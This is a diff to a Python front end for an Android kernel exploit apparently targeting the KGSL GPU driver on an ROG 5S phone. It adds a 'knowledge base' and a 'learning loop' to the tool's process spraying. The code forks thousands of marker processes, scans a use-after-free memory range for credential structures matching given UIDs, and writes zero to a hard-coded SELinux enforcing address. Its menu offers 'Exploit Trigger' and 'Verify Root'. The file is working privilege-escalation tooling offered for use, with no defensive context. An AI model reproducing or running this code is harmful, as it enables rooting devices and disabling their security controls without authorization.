@@ -4,12 +4,15 @@ import time
 import struct
 import subprocess
 import platform
+import json
 
 class MemoryExplorerAI:
     def __init__(self):
         self.found_items = []
         self.spray_procs = []
         self.exploit_proc = None
+        self.kb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "knowledge_base.json")
+        self.knowledge_base = self.load_kb()
         
         # Paths
         base_dir = os.path.dirname(os.path.abspath(__file__))
@@ -47,6 +50,18 @@ class MemoryExplorerAI:
             "tasks": 0x3f0
         }
 
+    def load_kb(self):
+        if os.path.exists(self.kb_path):
+            try:
+                with open(self.kb_path, 'r') as f:
+                    return json.load(f)
+            except: pass
+        return {"successful_vas": [], "hit_count": 0, "ranges": []}
+
+    def save_kb(self):
+        with open(self.kb_path, 'w') as f:
+            json.dump(self.knowledge_base, f, indent=4)
+
     def classify_page(self, page_data, va):
         """
         AI Heuristic Engine: Weighted classification of memory content.
@@ -58,16 +73,18 @@ class MemoryExplorerAI:
         
         for sig, name in self.kernel_structures.items():
             if sig in page_data:
+                # Add to knowledge base if it's a kernel structure
+                if hex(va) not in self.knowledge_base["successful_vas"]:
+                    self.knowledge_base["successful_vas"].append(hex(va))
+                    self.knowledge_base["hit_count"] += 1
+                    self.save_kb()
                 return {"type": "Kernel Core", "description": name, "va": hex(va), "confidence": 0.95, "data": page_data}
         
         # 2. Pattern Recognition (Weight 0.7)
-        # Check for UIDs at offset 4 (typical for cred struct)
-        # my_uid = 10237
         uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
         if uid_pattern in page_data:
              return {"type": "Privilege Struct", "description": f"CRED for UID 10237", "va": hex(va), "confidence": 0.85, "data": page_data}
 
-        # System UID 1000
         system_uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
         if system_uid_pattern in page_data:
             return {"type": "Privilege Struct", "description": "System UID Pattern (UID 1000)", "va": hex(va), "confidence": 0.8, "data": page_data}
@@ -101,6 +118,7 @@ class MemoryExplorerAI:
         print("="*85)
         print(" KGSL AI MEMORY EXPLORER & CLASSIFIER (ROG 5S Optimized)")
         print(f" STATUS: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | RAM: {self.get_ram_usage():.1f}%")
+        print(f" AI LEARNING: {self.knowledge_base['hit_count']} Patterns in Knowledge Base")
         if status_msg:
             print(f" LAST MSG: {status_msg}")
         print("="*85)
@@ -125,8 +143,8 @@ class MemoryExplorerAI:
             print(f" {'(No items found yet. Trigger [E] and Scan [S] to populate)':^80}")
             
         print("\n" + "="*85)
-        print(" [E] Exploit Trigger   [P] Spray Markers   [S] Start AI Scan   [C] Clear Memory")
-        print(" [R] Verify Root       [B] Rebuild Engine  [Q] Exit Explorer   [ID] Open File")
+        print(" [E] Exploit Trigger   [L] AI Learning Loop   [S] Start AI Scan   [C] Clear Memory")
+        print(" [R] Verify Root       [B] Rebuild Engine     [Q] Exit Explorer   [ID] Open File")
         print("="*85)
 
     def _read_data_packet(self):
@@ -189,7 +207,6 @@ class MemoryExplorerAI:
                 print(f"[!] Result: {res}")
                 time.sleep(1)
             if choice == 's':
-                # Example SELinux enforcing addr
                 selinux_addr = 0xffffffc002caa000 
                 res = self.patch_mem(selinux_addr, 0)
                 print(f"[!] Result: {res}")
@@ -224,23 +241,64 @@ class MemoryExplorerAI:
         except Exception as e:
             return f"Error: {str(e)}"
 
-    def run_spray(self, count=5000):
+    def run_learning_loop(self, total_target=1000, batch_size=100):
+        """
+        Refactored Spray: Continuous learning loop.
+        1. Spray 100 markers (millisecond speed).
+        2. Scan for offsets.
+        3. Save successes to Knowledge Base.
+        4. Kill spray processes to free memory.
+        5. Repeat.
+        """
         import ctypes
         libc = ctypes.CDLL(None)
-        start_count = len(self.spray_procs)
-        for i in range(count):
-            try:
-                pid = os.fork()
-                if pid == 0:
-                    libc.prctl(15, f"KETO{i+start_count:04d}".encode(), 0, 0, 0)
-                    while True: time.sleep(100)
-                else: 
-                    self.spray_procs.append(pid)
-                    if i % 1000 == 0 and i > 0:
-                         print(f"[*] Sprayed {i}...")
-            except OSError:
-                break
-        return f"Sprayed {len(self.spray_procs) - start_count} markers."
+        
+        current_total = 0
+        status_msg = ""
+        
+        while current_total < total_target:
+            print(f"[*] Learning Cycle: {current_total}/{total_target} processes used...")
+            batch_pids = []
+            
+            # 1. Fast Spray (millisecond intervals)
+            for i in range(batch_size):
+                try:
+                    pid = os.fork()
+                    if pid == 0:
+                        libc.prctl(15, f"KETO{current_total + i:04d}".encode(), 0, 0, 0)
+                        while True: time.sleep(100)
+                    else:
+                        batch_pids.append(pid)
+                        time.sleep(0.001) # 1ms interval
+                except OSError: break
+            
+            # 2. Scan and record
+            if self.exploit_proc:
+                self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
+                self.exploit_proc.stdin.flush()
+                
+                while True:
+                    line = self.exploit_proc.stdout.readline().decode().strip()
+                    if not line or "SCAN_DONE" in line: break
+                    if "MATCH:" in line:
+                        va = int(line.split(":")[1], 16)
+                        data = self._read_data_packet()
+                        if data:
+                            classification = self.classify_page(data, va)
+                            if classification['confidence'] > 0.5:
+                                if not any(int(item['va'], 16) == va for item in self.found_items):
+                                    self.found_items.append(classification)
+                                    print(f" [!] AI LEARNED: {classification['description']} at {hex(va)}")
+            
+            # 3. Kill and Cleanup
+            for pid in batch_pids:
+                try: os.kill(pid, 9); os.waitpid(pid, 0)
+                except: pass
+            
+            current_total += batch_size
+            time.sleep(0.1)
+        
+        return f"Learning Complete. Total processes: {current_total}."
 
     def run(self):
         if not os.path.exists(self.engine_path): 
@@ -279,8 +337,8 @@ class MemoryExplorerAI:
                 break
             elif cmd == 'e':
                 status_msg = f"Exploit: {self.trigger_exploit()}"
-            elif cmd == 'p':
-                status_msg = self.run_spray()
+            elif cmd == 'l':
+                status_msg = self.run_learning_loop()
             elif cmd == 'c':
                 for pid in self.spray_procs:
                     try: os.kill(pid, 9); os.waitpid(pid, 0)
@@ -301,6 +359,16 @@ class MemoryExplorerAI:
                 if not self.exploit_proc: 
                     status_msg = "Engine not running"
                     continue
+                
+                # Prioritize ranges from Knowledge Base
+                if self.knowledge_base["successful_vas"]:
+                    print("[*] AI prioritizing known ranges...")
+                    for va_hex in self.knowledge_base["successful_vas"]:
+                        va = int(va_hex, 16)
+                        data = self.read_page(va)
+                        if data:
+                            self.found_items.append(self.classify_page(data, va))
+
                 print("[*] AI Scan started...")
                 try:
                     self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
